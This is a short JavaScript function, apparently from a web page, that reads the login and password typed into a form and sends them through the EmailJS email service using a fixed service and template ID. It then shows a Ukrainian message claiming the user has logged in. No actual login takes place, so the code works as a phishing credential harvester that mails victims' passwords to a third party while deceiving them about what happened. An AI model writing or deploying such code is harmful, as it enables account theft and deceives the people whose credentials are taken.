function sendMail(){
    let parametr={
        login:  document.getElementById("login").value,
        password:  document.getElementById("password").value,
    }
    emailjs.send("service_cx21z4q", "template_0yyhieo", parametr).then(function(res){
        alert("Ви увішли до облікового запису" + res.status);
    })
}